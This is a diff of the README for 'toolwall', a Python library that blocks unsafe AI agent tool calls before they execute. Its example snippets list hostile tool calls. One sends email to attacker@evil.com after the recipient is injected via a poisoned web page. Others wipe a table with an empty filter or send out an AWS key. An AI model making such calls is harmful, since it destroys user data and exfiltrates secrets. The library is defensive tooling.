@@ -5,20 +5,20 @@
 [![License: MIT](https://img.shields.io/pypi/l/toolwall.svg)](https://github.com/Dev-Saif-Ops/toolwall/blob/main/toolwall/LICENSE)
 [![Zero dependencies](https://img.shields.io/badge/dependencies-zero-brightgreen.svg)](https://github.com/Dev-Saif-Ops/toolwall)
 
-**A fail-closed firewall for AI agent tool calls.**
+**The security gateway for AI agent tool calls.**
 
-Structured outputs already guarantee your agent's tool calls are *well-formed*.
-Nothing guarantees they're *allowed*. `toolwall` is the checkpoint that sits between
-the LLM's tool call and execution, and blocks the schema-valid-but-wrong ones.
+Your LLM can generate a *valid* tool call. That doesn't mean it's *safe* to execute.
 
 ```python
 delete_records(filter={})            # perfectly valid JSON. whole table gone.
 send_email(to="attacker@evil.com")   # recipient injected via a poisoned web page
-db_query(limit=10_000_000)           # schema-valid. production melts.
+transfer_money(amount=999999999)     # schema-valid. every field the right type.
+db_query(limit=10_000_000)           # production melts.
 ```
 
-Every one of these passes JSON schema validation. Nothing in the platform stack stops
-them. `toolwall` does.
+Every one of these passes JSON schema validation. Structured outputs, schemas, and
+content moderation all wave them through. `toolwall` is the fail-closed checkpoint
+between the LLM's tool call and execution that blocks them.
 
 ---
 
@@ -34,25 +34,44 @@ calling (and plain dicts). Python 3.10+.
 ## Quickstart
 
 ```python
-from toolwall import Gate, Meter, Policy, Shield, ToolSchema, in_range, not_empty
+from toolwall import ToolWall, Policy, ToolSchema, in_range, not_empty
 
-gate = Gate(default="deny", meter=Meter(), shield=Shield(mode="block"))
+wall = ToolWall()   # default-deny, secret detection + audit on
 
-gate.register(
-    "db_query", db_query,
-    schema=ToolSchema(required=["q"], types={"q": str, "limit": int}),
-    policy=Policy(constraints={"limit": in_range(1, 100)}),
-)
-gate.register(
-    "delete_records", delete_records,
-    schema=ToolSchema(required=["filter"], types={"filter": dict}),
-    policy=Policy(constraints={"filter": not_empty}, require_approval=True),
-)
-gate.budget(max_calls=20)
+wall.register("db_query", db_query,
+              schema=ToolSchema(required=["q"], types={"q": str, "limit": int}),
+              policy=Policy(constraints={"limit": in_range(1, 100)}))
+wall.register("delete_records", delete_records,
+              schema=ToolSchema(required=["filter"], types={"filter": dict}),
+              policy=Policy(constraints={"filter": not_empty}, require_approval=True))
+wall.budget(max_calls=20)
 
-result = gate.run(openai_response)   # any provider shape, or a plain dict
-# result.verdict: ALLOW | BLOCK | NEEDS_APPROVAL. Only ALLOW executes.
+result = wall.call("delete_records", {"filter": {}})
+# result.blocked -> True
+# result.reason  -> "policy violation: arg 'filter' rejected by not_empty"
+
+results = wall.guard(openai_response)   # or gate a raw OpenAI/Anthropic/Gemini response
 ```
+
+Only an `ALLOW` verdict runs the tool. `Gate` is the lower-level primitive underneath.
+
+## What it stops
+
+```python
+wall.call("delete_records", {"filter": {}})
+# BLOCKED: policy violation: arg 'filter' rejected by not_empty
+
+wall.call("send_email", {"to": "ops@ourco.com", "body": "aws key AKIA..."})
+# BLOCKED: secret detected (aws-access-key) in arg 'body'
+
+wall.call("db_query", {"q": "everything", "limit": 10_000_000})
+# BLOCKED: policy violation: arg 'limit' rejected by in_range(1, 100)
+
+wall.call("run_shell", {"cmd": "..."})
+# BLOCKED: unknown tool: 'run_shell'
+```
+
+Everything not explicitly allowed is blocked. That is the whole idea.
 
 ## What it does
 
